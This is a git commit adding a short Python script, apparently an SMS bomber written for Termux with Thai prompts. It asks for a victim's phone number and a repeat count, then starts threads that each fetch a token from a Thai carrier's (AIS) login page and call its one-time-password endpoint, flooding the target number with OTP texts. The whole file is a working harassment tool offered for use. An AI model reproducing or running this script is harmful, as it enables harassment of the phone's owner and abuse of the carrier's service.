7ff3cce542b12f5a1c9db8e220e38b9a9b013709
Hacker <101183157+AnnErrorGM@users.noreply.github.com>
2022-03-08 18:12:51 +0700

    Add files via upload

---
+++ sms-gm.py
@@ -0,0 +1,30 @@
+import requests,json
+import random
+import os
+import time
+import threading
+from requests import get
+from re import search
+from requests import Session
+from threading import Thread
+
+
+
+
+
+
+os.system('clear')
+os.system("termux-open-url https://youtu.be/dzrqh4SbIv0")
+phone = input("\033[1;92m เบอร์ : ")
+jam = int(input("\033[1;92m จำนวน : "))
+print("")
+
+def sms():
+	session = Session()
+	ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
+	session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
+	print(f"ยิง{phone} แล้วจำนวน {jam}")
+	
+for i in range(jam):
+	time.sleep(1)
+	threading.Thread(target=sms).start()
